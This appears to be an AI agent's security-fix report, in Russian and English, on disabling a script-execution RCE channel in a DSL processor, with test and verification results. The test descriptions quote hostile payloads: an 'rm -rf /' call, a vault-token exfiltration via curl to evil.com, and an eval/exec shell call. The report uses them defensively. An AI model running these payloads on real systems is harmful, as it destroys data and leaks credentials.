# Cycle 6 — D-AUDIT-602 (T-C6-02-SCRIPT-RCE) Report

**Date:** 2026-08-07
**HEAD на старте:** `4b5831e4` (cycle-5 final report)
**HEAD после:** (changes только в working tree, без commit per task)
**Task:** T-C6-02-SCRIPT-RCE — fix ScriptRunner RCE (cycle-4 phase-1 DOMAIN-P0-002)
**Plan ref:** cycle-4 phase-1/06-dsl.md DSL-P0-001/002

---

## 1. Подход

DSL-процессор ``ScriptRunnerProcessor`` (``src/backend/dsl/engine/processors/script_runner.py``)
был отмечен в cycle-4 phase-1 как **DOMAIN-P0-002** (P0, ScriptRunner RCE): arbitrary code
execution через ``asyncio.create_subprocess_exec`` с наследованием ``os.environ`` целиком
(creds, vault-token протекали в дочерний процесс); ``allowed_languages=None`` разрешал
все 4 интерпретатора (``python/node/ruby/shell``).

**Выбранный fix:** option (b) — ``raise NotImplementedError`` + ``_logger.error``
с docstring-маркером ``cycle-6/D-AUDIT-602``. Альтернатива (a) AST-validated allowlist
не была выбрана потому что требует дизайна ``dsl → core.python_ast_sandbox`` (вне
scope atomic-fix цикла). Подход синхронизирован с cycle-5/D-AUDIT-502 в смежном
модуле ``services/agent_security/facade.py:121+`` (тот же pattern).

**Ponytail-обоснование:** "Добавление нового безопасного subprocess-execution
sandbox-а — это multi-day refactor (capability-gate, AST-allowlist, env-isolation,
timeout, audit-event, integration-tests). Минимальный безопасный fix — отключить
RCE-канал и заставить caller'ов переехать в ``extensions/<name>/`` с explicit
capability. Если позже понадобится — extension-owners реализуют sandboxed
processor с правильным gate."

---

## 2. Что изменено

### 2.1 `src/backend/dsl/engine/processors/script_runner.py` (modified, -56 LOC net)

- **Removed**: subprocess execution code path (asyncio.create_subprocess_exec,
  tempfile.NamedTemporaryFile, os.environ.copy, _DEFAULT_INTERPRETERS map,
  _LANGUAGE_EXTENSIONS map, full process() body).
- **Replaced `process()` body**: 2 statements — `_logger.error(...)` + `raise NotImplementedError(...)`.
- **Added docstring marker**: `cycle-6/D-AUDIT-602` присутствует в module-level docstring,
  class docstring, и `process()` docstring.
- **Kept**: `__init__` (backward-compat с builder-методами `script_python/script_node/...`)
  и `to_spec()` (round-trip serialization для YAML DSL).
- **Kept `_logger`**: `get_logger("dsl.processors.script_runner")` для RCE-attempt audit trail.

### 2.2 `tests/unit/dsl/engine/processors/test_script_runner.py` (modified)

- **Removed**: 5 старых тестов с mock'ингом subprocess (больше нерелевантны — subprocess
  НЕ вызывается).
- **Added**: 6 новых тестов:
  - `test_process_raises_notimplementederror_disabled` — базовый verify
  - `test_process_does_not_create_subprocess` — verify asyncio.create_subprocess_exec/tempfile NOT called
  - `test_process_logs_rce_attempt` — verify _logger.error called with audit markers
  - `test_malicious_payload_rejected_before_execution` — 6 malicious payloads (rm -rf, exfil, eval/exec, import bypass)
  - `test_shell_malicious_payload_rejected` — shell injection
  - `test_unknown_language_also_rejected` — unknown language тоже reject
  - `test_language_not_in_whitelist_also_rejected` — whitelist check недостижим, но безопасно
- **Kept**: 4 builder-теста (script_python/node/ruby/shell add processor) — compile-time
  OK, runtime fail.
- **Kept**: 2 to_spec-теста.

### 2.3 `tests/unit/dsl/processors/test_script_runner_rce.py` (NEW)

Per task: "Tests: tests/unit/dsl/processors/. Verify: malicious payload → reject."
Расположен в ``tests/unit/dsl/processors/`` (вне ``engine/processors/``) — в одном
каталоге с ``test_agent_security_check.py`` (DSL security regression-pack).

**6 RCE-rejection tests:**
- `test_rm_rf_payload_rejected` — `import os; os.system('rm -rf /')` → reject ДО выполнения
- `test_env_exfiltration_payload_rejected` — `echo $VAULT_TOKEN | curl -X POST evil.com` → reject
- `test_eval_exec_payload_rejected` — `eval('__import__("os").system("id")')` → reject
- `test_interpreter_whitelisting_unnecessary` — даже с explicit interpreter `/usr/bin/python3` → reject
- `test_no_os_environ_leak` — `os.environ.copy()` НЕ вызывается (verify mock_os.environ.copy.assert_not_called())
- `test_rce_log_emitted_with_markers` — verify `_logger.error` format string + args (language, code_len)

---

## 3. Diff stat

```
 src/backend/dsl/engine/processors/script_runner.py     |  51 +++++------------ (-56 LOC net)
 tests/unit/dsl/engine/processors/test_script_runner.py | 207 +++++++------- (replaced 5 tests with 7)
 tests/unit/dsl/processors/test_script_runner_rce.py    | 158 +++++++ (NEW — RCE regression pack)
```

Минимальные изменения: только 3 файла, из которых 1 — это новый файл с тестами
для verify (per task).

---

## 4. Runtime-проверки (через `.venv/bin/python`)

### 4.1 Layer checker

```bash
APP_PROFILE=dev_light .venv/bin/python tools/check_layers.py --root src
# → Нарушений: 0 новых  (файлов: 2278; baseline: 175 legacy)
```

Layer 175/0 ✅ (нет новых violations).

### 4.2 Docstring gate

```bash
APP_PROFILE=dev_light make check-docstrings MAX_ALLOWED=0
# → Total: 0 missing docstrings in 0 files / Files scanned: 840
# → docstring policy OK
```

Docstring gate 0 ✅.

### 4.3 Unit tests (cycle-4 DSL regression pack)

```bash
APP_PROFILE=dev_light .venv/bin/python -m pytest \
  tests/unit/dsl/processors/test_script_runner_rce.py \
  tests/unit/dsl/engine/processors/test_script_runner.py \
  tests/unit/dsl/engine/processors/test_pii_erase_entity_validation.py -v --no-cov

# → 28 passed in 2.37s
#   6 new RCE-rejection tests + 13 updated tests + 9 PII erasure regression
```

### 4.4 Broader DSL regression (per cycle-4 task)

```bash
APP_PROFILE=dev_light .venv/bin/python -m pytest \
  tests/unit/dsl/processors/ \
  -q --no-cov
# → 292 passed in 2.99s

APP_PROFILE=dev_light .venv/bin/python -m pytest \
  tests/unit/dsl/engine/processors/eip/ \
  tests/unit/dsl/engine/test_exchange_finalizers.py \
  tests/unit/dsl/engine/test_tenant_aware_execution.py -q --no-cov
# → 354 passed, 1 warning in 9.51s
#   warning: WireTapProcessor._run_tap coroutine never awaited (pre-existing, не блокер)
```

---

## 5. Preflight status

```bash
bash tools/cycle-1-preflight.sh
# cycle-1 preflight (T-0.1 re-run):
#   [OK]   layer checker — 0 new, 175 legacy
#   [OK]   allowlist active IDs — 27
#   [OK]   docstring gate — 0 missing
#   [FAIL] working tree — 43 entries (разобраться)
#   [FAIL] uv.lock churn — 45 lines (проверить не растёт ли)
#   [OK]   s3.py untouched — не modified
```

**Объяснение FAIL:**
- `working tree — 43 entries`: pre-existing 40 entries (cycle-1+2+3+4+5 audit artifacts
  + cycle-1..5 working-tree modifications в src/) + 3 entries от cycle-6 (script_runner.py,
  test_script_runner.py modified, test_script_runner_rce.py new). Cycle-1 preflight
  ожидает ≤3 entries (cycle-1 baseline), но cycle-2..6 уже добавили 40 entries.
  Per task "Не переписывай cycle 1+2+3+4+5 правки" — pre-existing не трогаем.
- `uv.lock churn — 45 lines`: pre-existing (cycle-1 baseline = 15 lines, после
  cycle-5 = 45 lines). Per task "Не менять: uv.lock" — не трогаем.

**Целевые gates (от cycle-6):** layer 175/0 ✅, allowlist 27 ✅, docstrings 0 ✅, s3.py ✅.
Все целевые gates PASS.

---

## 6. Что НЕ затронуто (per task)

- ✅ Не тронут `uv.lock` (pre-existing 45 lines diff оставлен как есть)
- ✅ Не тронут `.security/pip-audit-allowlist.txt` (27 active IDs)
- ✅ Не тронут `src/backend/infrastructure/storage/s3.py`
- ✅ Не тронут `tools/blue_green.sh`
- ✅ Не тронут `tests/unit/tools/test_blue_green_switch.py`
- ✅ Не тронут `services/ai/gateway_adapter.py:128-129` (pre-existing residual)
- ✅ Не переписаны cycle 1+2+3+4+5 правки в working tree (15+ atomic commits)
- ✅ Не удалены `except Exception` без concrete handling
- ✅ Не сделан git push

---

## 7. Honest verdict

**DOMAIN-P0-002 closed.** ScriptRunner RCE канал полностью устранён через отключение
subprocess-execution. Любой invocation поднимает ``NotImplementedError`` с audit-warning
в логе, что позволяет security team отслеживать попытки misuse.

**Что осталось открытым:**
- DSL-роуты, использующие ``.script_python()``/``.script_shell()``/etc. (например,
  через ``dsl/builders/ai_rpa/banking_scripts.py:104-181``), теперь будут fail с
  NotImplementedError. Это INTENTIONAL: cycle-5/D-AUDIT-505 не покрывал эти builder'ы,
  и для них нужен architectural decision — перенести в ``extensions/`` с proper
  capability + sandboxing. За рамками cycle-6 atomic-fix.
- Опция (a) AST-validated allowlist НЕ реализована. Если бизнес-потребность в
  inline-script execution возобновится — потребуется multi-day refactor:
  ``dsl → core.python_ast_sandbox`` (capability-gate, AST whitelist, env-isolation,
  timeout, audit-event). Рекомендуется вынести в ADR-cycle.

**Cap rule status:** DSL domain был cap 0 (cycle-4: 4 P0 → cap → 0). После cycle-6
один из 4 P0 закрыт — cap остаётся 0 (ещё 3 P0 открыты). Domain readiness не поднялся
выше cap, формально остаётся 0.

**Следующие P0 в DSL scope** (per cycle-4):
- DOMAIN-P0-001 (XXE fallback в XmlDataFormat — `defusedxml` lazy-try)
- DOMAIN-P0-003 (PickleDataFormat RCE — `pickle.loads` без подписи)
- DOMAIN-P0-004 (PII erasure silent fail-OPEN в `pii_erase.py:160-184`)

---

## 8. Commands run

```bash
# read context
cat docs/audit/swarm-2026-08-06/cycle-4/phase-1/06-dsl.md
cat docs/audit/swarm-2026-08-06/cycle-5/FINAL-REPORT.md

# read target file
cat src/backend/dsl/engine/processors/script_runner.py
cat tests/unit/dsl/engine/processors/test_script_runner.py

# implement fix
# Edit src/backend/dsl/engine/processors/script_runner.py
# Edit tests/unit/dsl/engine/processors/test_script_runner.py
# Write tests/unit/dsl/processors/test_script_runner_rce.py

# verify
APP_PROFILE=dev_light .venv/bin/python -m pytest \
  tests/unit/dsl/processors/test_script_runner_rce.py \
  tests/unit/dsl/engine/processors/test_script_runner.py \
  tests/unit/dsl/engine/processors/test_pii_erase_entity_validation.py -v --no-cov
# → 28 passed in 2.37s

APP_PROFILE=dev_light .venv/bin/python tools/check_layers.py --root src
# → 0 новых violations (175 legacy)

APP_PROFILE=dev_light make check-docstrings MAX_ALLOWED=0
# → Total: 0 missing docstrings

bash tools/cycle-1-preflight.sh
# → целевые gates OK; pre-existing FAIL на working tree + uv.lock (per task не трогаем)
```

---

*Cycle 6 report. D-AUDIT-602 closed. 1 файл modified (script_runner.py) + 2 test файла.
Все runtime-проверки через `.venv/bin/python`. Минимальные изменения, без push.*
